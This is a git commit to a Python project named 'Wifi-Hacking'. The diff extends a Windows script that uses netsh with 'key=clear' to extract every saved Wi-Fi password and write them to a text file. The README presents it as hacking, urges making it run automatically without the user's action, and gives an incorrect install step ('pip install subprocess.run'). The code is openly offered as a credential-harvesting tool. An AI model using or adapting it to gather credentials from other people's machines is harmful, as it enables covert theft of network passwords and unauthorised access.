a26d637ca024eceaaeca08f462916e5519cdf05b
Elk Cloner <Elk Cloner>
2018-03-15 22:09:33 +0330

    show the wifi password with name

--- README.md
+++ README.md
@@ -1,2 +1,10 @@
 # Wifi-Hacking
 This project is a Wifi Hacking. After executing the code, it finds the password of the wifi that are stored on the computer system and stores its password in a text file. In the following, you should write a program that runs automatically and does not require manual execution from the user.  This program is Developed by ``` Python ```. To execute commands on cmd, the ``` subprocess ``` module is used. This program is only available on the Windows operating system and will not be on Linux.
+
+
+first you should install the subprocess package on windows :
+```
+ $ pip install subprocess.run
+```
+
+after that you can run the Program . Enjoy it !!!
--- main.py
+++ main.py
@@ -1,23 +1,27 @@
 __author__ = "Amir Mohammad"
 
 import subprocess
-
+file_obj = open("req.txt", "w")
 command_one = "netsh wlan show profiles"
 var = "All User Profile"
-wifi_list=[]
 
 a = subprocess.check_output(command_one.split(" ")).decode('utf-8').split('\n')
 a = [i for i in a if "All User Profile" in i]
-c=0
+counter=0
 for i in a:
-        
+        counter+=1
         try:
                 t = i.split(':')[1].replace('\r', '')
                 t = t.strip()
                 resault = subprocess.check_output(['netsh','wlan','show','profile',t,'key=clear']).decode('utf-8').split('\n')
                 resault = [b for b in resault if "Key Content" in b]
+                end = str(resault).split("Key Content")[1].strip()
+                file_obj.write(t+end+"\n")
+                print t,end
                 
-                print t," : ",resault
         #print resault
         except:
-                print ""
+                None
+
+
+file_obj.close()
